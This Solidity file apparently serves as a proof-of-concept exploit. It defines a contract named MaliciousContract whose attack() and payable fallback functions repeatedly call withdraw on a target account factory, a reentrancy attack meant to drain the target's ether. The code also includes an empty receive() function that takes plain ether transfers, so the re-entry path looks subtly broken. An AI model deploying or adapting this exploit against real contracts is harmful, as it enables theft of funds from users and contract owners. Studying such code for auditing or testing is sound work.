// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

interface IMultiOwnerModularAccountFactory {
    function withdraw(address payable to, uint256 amount) external;
}

contract MaliciousContract {
    IMultiOwnerModularAccountFactory public factory;

    constructor(address _factory) {
        factory = IMultiOwnerModularAccountFactory(_factory);
    }

    // Fallback function used to perform reentrancy attack
    fallback() external payable {
        if (address(factory).balance >= 1 ether) {
            factory.withdraw(payable(address(this)), 1 ether);
        }
    }

    function attack() public payable {
        factory.withdraw(payable(address(this)), 1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    // Allow contract to receive ether
    receive() external payable {}
}
